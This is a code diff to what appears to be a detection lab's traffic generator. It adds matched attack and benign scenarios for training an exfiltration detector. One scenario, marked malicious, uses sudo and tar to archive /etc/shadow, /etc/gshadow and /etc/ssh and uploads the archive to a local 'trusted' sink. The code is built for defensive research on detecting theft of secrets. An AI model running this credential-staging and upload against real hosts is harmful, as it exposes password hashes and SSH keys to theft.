@@ -639,6 +639,81 @@ def telemetry_small_workload(wd, rng, act):
         sink.close()
 
 
+# --------------------------------------------------------------------------
+# Destination-mix scenarios (so `known_destinations` / dest_known is informative instead of a label
+# leak). The lab's trusted hosts are KNOWN_HOSTS (list them in policy.yaml known_destinations for a
+# capture); the earlier scenarios send attacks to 127.0.0.2/.4 and benign work to 127.0.0.3/.5, so
+# listing the benign hosts alone would separate them by construction. These three break that:
+#   * an attack that abuses a TRUSTED host (a compromised backup credential: dest_known = 1),
+#   * a benign backup to a NEW, unlisted host (dest_known = 0),
+#   * a benign telemetry upload to a NEW vendor host (dest_known = 0).
+# --------------------------------------------------------------------------
+
+KNOWN_HOSTS = ("127.0.0.3", "127.0.0.5")     # what a capture lists in known_destinations
+NEW_HOSTS = ("127.0.0.6", "127.0.0.7")       # benign destinations that are NOT listed
+
+
+def exfil_via_known_host_real(wd, rng, act):
+    """An intruder uploads the staged secrets to the TRUSTED backup host (stolen backup
+    credentials): same volume class as exfil_small_real, but the destination is a known host, so
+    destination identity alone no longer gives it away. MATCHED with benign_backup_new_host."""
+    sink = _Sink("127.0.0.3")
+    sink.start()
+    try:
+        for rnd in range(rng.randint(2, 4)):
+            stage = os.path.join(wd, f".k{rnd}.tgz")
+            act("stage_secrets_with_tar", malicious=True, round=rnd)
+            run(["sudo", "-n", "tar", "czf", stage, "/etc/shadow", "/etc/gshadow", "/etc/ssh"])
+            if os.path.exists(stage):
+                sent = _upload("127.0.0.3", sink.port, stage)
+                act("send_out_to_trusted_host", malicious=True, round=rnd, bytes=sent)
+            time.sleep(rng.uniform(0.5, 1.5))
+    finally:
+        sink.close()
+
+
+def backup_new_host_workload(wd, rng, act):
+    """HARD NEGATIVE: a legitimate backup of /etc (secrets included) to a newly provisioned
+    backup host that is NOT in known_destinations (dest_known = 0). Same shape as backup_remote,
+    different destination identity."""
+    sink = _Sink(rng.choice(NEW_HOSTS))
+    sink.start()
+    try:
+        for rnd in range(rng.randint(2, 4)):
+            archive = os.path.join(wd, f"etc-new-{rnd}.tgz")
+            act("backup_etc", round=rnd)
+            run(["sudo", "-n", "tar", "czf", archive, "/etc"], timeout=90)
+            if os.path.exists(archive):
+                sent = _upload(sink.srv.getsockname()[0], sink.port, archive)
+                act("upload_to_new_backup_host", round=rnd, bytes=sent)
+            time.sleep(rng.uniform(0.5, 1.5))
+    finally:
+        sink.close()
+
+
+def telemetry_new_host_workload(wd, rng, act):
+    """HARD NEGATIVE: the small inventory upload, but to a new vendor host that is NOT listed."""
+    sink = _Sink(rng.choice(NEW_HOSTS))
+    sink.start()
+    try:
+        for rnd in range(rng.randint(2, 4)):
+            report = os.path.join(wd, f"inventory-{rnd}.txt")
+            act("collect_inventory", round=rnd)
+            with open(report, "w") as f:
+                run(["uname", "-a"], stdout=f)
+                run(["df", "-h"], stdout=f)
+                run(["cat", "/etc/os-release"], stdout=f)
+                if run(["dpkg-query", "-W"], stdout=f) != 0:
+                    run(["ls", "-l", "/usr/bin"], stdout=f)
+            with open(report, "r+b") as f:
+                f.truncate(rng.randint(20_000, 40_000))
+            sent = _upload(sink.srv.getsockname()[0], sink.port, report)
+            act("upload_inventory_to_new_host", round=rnd, bytes=sent)
+            time.sleep(rng.uniform(0.5, 1.5))
+    finally:
+        sink.close()
+
+
 SCENARIOS = {
     # name: (kind, family, function, approx_seconds)
     "credential_access":      ("attack", "credential_access",    credential_access,       8),
@@ -667,6 +742,10 @@ SCENARIOS = {
     "benign_backup_bulk":     ("benign", "backup_bulk",          backup_bulk_workload,    25),
     "benign_heartbeat_real":  ("benign", "heartbeat",            heartbeat_real_workload, 28),
     "benign_telemetry_small": ("benign", "telemetry_small",      telemetry_small_workload, 12),
+    # destination-mix scenarios (see the section above)
+    "exfil_via_known_host_real": ("attack", "exfil_known",       exfil_via_known_host_real, 12),
+    "benign_backup_new_host":  ("benign", "backup_new",          backup_new_host_workload, 14),
+    "benign_telemetry_new_host": ("benign", "telemetry_new",     telemetry_new_host_workload, 12),
 }
 
 
@@ -674,10 +753,14 @@ SCENARIOS = {
 # before the real-byte scenarios existed (use it to stay comparable with them); "real_bytes" is the new set.
 REAL_BYTE_NAMES = ("exfil_small_real", "exfil_bulk_real", "exfil_slow_real", "c2_beacon_real",
                    "benign_backup_bulk", "benign_heartbeat_real", "benign_telemetry_small")
+DEST_MIX_NAMES = ("exfil_via_known_host_real", "benign_backup_new_host", "benign_telemetry_new_host")
 GROUPS = {
     "all": tuple(sorted(SCENARIOS)),
-    "legacy": tuple(sorted(n for n in SCENARIOS if n not in REAL_BYTE_NAMES)),
+    "legacy": tuple(sorted(n for n in SCENARIOS if n not in REAL_BYTE_NAMES and n not in DEST_MIX_NAMES)),
     "real_bytes": tuple(sorted(REAL_BYTE_NAMES)),
+    "dest_mix": tuple(sorted(DEST_MIX_NAMES)),
+    # real_bytes plus the destination mix: the set meant for training captures with known_destinations listed
+    "v2": tuple(sorted(REAL_BYTE_NAMES + DEST_MIX_NAMES)),
 }
 
 
